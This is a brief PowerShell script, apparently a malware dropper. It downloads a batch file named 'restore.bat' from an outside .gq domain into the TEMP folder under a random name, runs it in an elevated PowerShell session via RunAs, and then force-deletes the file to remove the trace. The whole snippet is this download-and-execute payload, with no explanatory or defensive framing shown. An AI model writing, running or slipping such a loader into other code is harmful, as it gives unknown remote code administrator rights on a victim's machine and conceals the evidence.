$url = "https://gbee.zgqinc.gq/restore.bat"
$file = "$env:TEMP\restore_$(Get-Random).bat"

Start-Process powershell -Verb RunAs -ArgumentList "-c iwr '$url' -OutFile '$file'; cmd /c '$file'; rm '$file' -Force"
